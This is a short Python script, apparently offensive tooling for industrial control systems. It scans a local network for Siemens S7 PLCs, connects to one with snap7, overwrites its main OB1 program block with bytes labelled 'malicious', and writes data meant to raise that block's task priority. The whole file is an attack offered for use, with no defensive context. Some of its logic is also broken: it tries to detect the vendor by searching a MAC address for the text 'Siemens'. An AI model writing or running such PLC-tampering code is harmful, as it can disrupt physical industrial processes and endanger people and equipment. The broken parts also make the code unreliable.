import snap7
from scapy.all import ARP, Ether, srp
import time

# Function to scan network for Siemens PLCs
def find_siemens_s7():
    target_ip = "192.168.1.1/24"  # Modify based on target network range
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
    ans, _ = srp(request, timeout=2, verbose=False)

    for sent, received in ans:
        if "Siemens" in received.hwsrc:  # Identify vendor (improvised detection)
            return received.psrc  # Return IP of detected Siemens PLC
    return None

# Function to connect to the PLC
def connect_to_plc(ip):
    plc = snap7.client.Client()
    try:
        plc.connect(ip, 0, 1)  # Connect on rack=0, slot=1
        print(f"[+] Connected to PLC at {ip}")
        return plc
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return None

# Function to modify the controller tasking
def modify_controller_tasking(plc):
    try:
        # Sample: Upload new malicious OB1 block
        malicious_ob1 = b'\x11\x22\x33\x44\x55\x66\x77\x88'  # Placeholder binary code
        plc.download(malicious_ob1)  # Overwrite OB1 program
        
        time.sleep(2)

        # Set OB1 to execute with higher priority
        task_settings = b'\x00\x02\x00\x01'  # Example modification (priority increase)
        plc.write_area(snap7.types.S7AreaDB, 1, 0, task_settings)

        print("[+] Controller tasking modified successfully!")
    except Exception as e:
        print(f"[-] Failed to modify tasking: {e}")

# Main execution
def main():
    print("[*] Scanning for Siemens S7-1200 PLCs...")
    plc_ip = find_siemens_s7()
    
    if plc_ip:
        print(f"[+] PLC found at {plc_ip}")
        plc = connect_to_plc(plc_ip)
        
        if plc:
            modify_controller_tasking(plc)
            plc.disconnect()
    else:
        print("[-] No Siemens PLCs found.")

if __name__ == "__main__":
    main()